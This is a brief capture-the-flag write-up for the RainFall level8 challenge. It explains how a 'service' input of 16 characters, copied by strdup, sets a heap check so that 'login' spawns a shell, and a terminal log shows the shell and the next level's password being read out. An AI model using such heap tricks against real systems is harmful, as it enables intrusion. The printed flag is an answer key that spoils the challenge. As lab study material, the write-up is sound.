auth command uses malloc to allocate 4 bytes of heap memory,

```
if (auth != nullptr && auth[32] != 0)
```

We have to make sure that *auth + 32 is != 0
So we use service command that also allocate heap memory but with strdup.
We can notice that strdup allocate memory from *auth + 16 address.
If we use "service <16 chars>" we will reach *auth + 32.
Finally we use login command to get the shell

```
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth 77 
    0x804a008, (nil) 
    service 4578451245784512
    0x804a008, 0x804a018 
    login
    $ whoami       
    level9
    $ cat /home/user/level9/.pass        
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

```

